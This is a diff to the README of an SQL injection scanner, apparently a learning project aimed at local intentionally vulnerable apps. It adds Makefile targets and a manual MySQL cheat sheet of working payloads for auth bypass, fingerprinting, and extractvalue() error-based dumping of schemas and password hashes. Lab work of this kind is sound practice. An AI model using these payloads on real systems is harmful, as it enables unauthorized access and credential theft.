@@ -29,20 +29,29 @@ npm run vaccine -- -X POST "http://localhost:5000/login?username=test&password=t
 npm run vaccine -- -X POST "http://localhost:10001/login?user=test&pass=test"
 ```
 
-### Spinning up the PostgreSQL target (vuln-bank)
-Install Vuln-bank:
+### Spinning up the targets
+
+The top-level `Makefile` wraps both bundled docker-compose stacks.
+
+**PostgreSQL — vuln-bank** (http://localhost:5000):
 ```bash
-./test_env.sh
+make postgresql        # build + start
+make postgresql-up     # start (no rebuild)
+make postgresql-down   # stop
+make postgresql-clean  # stop + wipe volumes
+make postgresql-re     # clean + rebuild
 ```
 
-A `Makefile` wraps the bundled `vuln-bank` docker-compose stack:
-
+**MySQL — copy-n-paste** (http://localhost:10001):
 ```bash
-make up        # start (http://localhost:5000)
-make rebuild   # build + start
-make down      # stop
-make clean     # stop + wipe volumes
-make re        # clean + rebuild
+make mysql             # build + start + seed the DB
+make mysql-down        # stop + wipe volumes
+```
+
+Or drive both at once:
+```bash
+make all     # start both targets
+make clean   # tear both down
 ```
 
 ## How it works
@@ -54,9 +63,14 @@ make re        # clean + rebuild
 2. **Fingerprint** (`fingerprint.js`) — boolean-based. Injects an engine-unique
    expression (e.g. `version() LIKE 'PostgreSQL%'`) and checks whether the page
    matches the known-true page. Detects MySQL, PostgreSQL, Oracle, SQLite, MSSQL.
-3. **Enumeration & dump** (`suitePostgresql.js`) — error-based. Casts leaked text
-   to `int` so PostgreSQL echoes the value inside its error message, walking:
-   database name → tables → columns → row-by-row dump.
+3. **Enumeration & dump** — error-based, one suite per engine, both walking
+   database name → tables → columns → row-by-row dump:
+   - PostgreSQL (`suitePostgresql.js`) casts leaked text to `int` so the engine
+     echoes the value inside its `invalid input syntax` error message.
+   - MySQL (`suiteMySql.js`) wraps the value in `extractvalue()` so the engine
+     leaks it inside its `XPATH syntax error` message. Because `extractvalue()`
+     reports at most 32 characters, long values are read in 31-char `MID()`
+     slices and stitched back together.
 
 Every confirmed finding (parameter, payload, technique) plus the recovered
 schema and dumped rows is persisted to the SQLite store.
@@ -138,6 +152,92 @@ test' AND 1=CAST((SELECT COALESCE(CAST("id" AS text),'NULL')||'~|~'||COALESCE(CA
 ```
 → `... : "40~|~2~|~CableTV Plus~|~CABLE001~|~Cable TV Services~|~30.00~|~NULL~|~true"`
 
+## Manual injection cheat-sheet MYSQL (copy-n-paste)
+
+The `user` parameter lands inside `select * from Users where username = '<user>'`,
+so the escape context is a single quote `'`.
+
+### Boolean — confirm injection / auth bypass
+First start with classic `'` test
+
+```
+admin'
+```
+→ `Error 1064: You have an error in your SQL syntax; ... near ''admin''' at line 1`.
+A broken quote raising a syntax error proves `'` was injected into the query.
+
+Then we can try:
+
+```
+admin' OR 1=1-- 42
+```
+→ Query becomes always-true
+
+```
+admin' AND 1=2-- 42
+```
+→ Always-false. The true/false split is what confirms injectability.
+
+### Boolean — engine fingerprint
+We first run a true page like `admin' OR 1=1-- 42` to get the baseline
+
+```
+admin' OR CONNECTION_ID()=CONNECTION_ID()-- 42
+```
+→ If the above is evaluated to true, it will behave like the true page ⇒ engine is MySQL/MariaDB.
+
+### Error-based — leak scalar values
+We wrap the value in `extractvalue()`; the invalid XPATH (marked with `0x7e` = `~`)
+forces the engine to echo it inside the error.
+
+```python
+# Get database name
+admin' AND extractvalue(1,concat(0x7e,database()))-- 42
+```
+→ `Error 1105: XPATH syntax error: '~a1db'`
+
+```python
+# Get version
+admin' AND extractvalue(1,concat(0x7e,version()))-- 42
+```
+→ `Error 1105: XPATH syntax error: '~10.6.3-MariaDB-1:10.6.3+mari...'`
+
+`extractvalue()` reports at most 32 chars (the `~` marker + 31 chars), so MariaDB
+truncates and appends `...`. Read past the cap with `MID(expr, offset, 31)`,
+incrementing `offset` by 31 each time and stitching the slices together:
+
+```python
+# Second 31-char slice of version()
+admin' AND extractvalue(1,concat(0x7e,MID((SELECT version()),32,31)))-- 42
+```
+
+### Error-based — enumerate schema
+
+List tables in the current database:
+```python
+# Get tables
+admin' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- 42
+```
+→ `... : '~products,credit_cards,secret...'` (truncated at 31 chars — walk with `MID` for the rest)
+
+List columns of a table (here `Users`):
+```python
+# Get columns per table
+admin' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='Users')))-- 42
+```
+→ `... : '~ID,Username,Password'`
+
+### Error-based — dump rows
+
+One row at a time via `LIMIT 1 OFFSET N`, columns joined with the `~|~`
+separator the tool parses, read in 31-char slices. Dump slice `0` of row `0`
+of `Users` (bcrypt password hash):
+```python
+# Get row per table
+admin' AND extractvalue(1,concat(0x7e,MID((SELECT CONCAT(IFNULL(CAST(`ID` AS CHAR),'NULL'),'~|~',IFNULL(CAST(`Username` AS CHAR),'NULL'),'~|~',IFNULL(CAST(`Password` AS CHAR),'NULL')) FROM `Users` LIMIT 1 OFFSET 0),1,31)))-- 42
+```
+→ `... : '~1~|~admin~|~$2a$14$0qozptyjLJl9'` (increment the `MID` offset by 31 to read the rest of the row, and `OFFSET` to walk rows)
+
 ## Database schema
 
 Results are persisted to a SQLite file (`vaccine.sqlite` by default). A scan owns
@@ -201,7 +301,7 @@ erDiagram
 | `src/injectable.js` | Injectability detection + escape context |
 | `src/fingerprint.js` | Boolean-based engine fingerprint |
 | `src/suitePostgresql.js` | PostgreSQL error-based enumeration & dump |
-| `src/suiteSqlite.js` | SQLite suite (stub) |
+| `src/suiteMySql.js` | MySQL error-based enumeration & dump |
 | `src/http.js` | GET/POST request helper |
 | `src/database.js` | SQLite persistence layer |
 | `src/helper.js` | Query mutation, response comparison, cleanup |
@@ -210,4 +310,5 @@ erDiagram
 ## Resources
 - [Detect database fingerprint](https://www.sqlinjection.net/database-fingerprinting/)
 - [PostgreSQL injection payloads](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/PostgreSQL%20Injection/)
+- [MySQL injection payloads](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection/)
 - [Juice Shop companion guide](https://pwning.owasp-juice.shop/companion-guide/latest/)
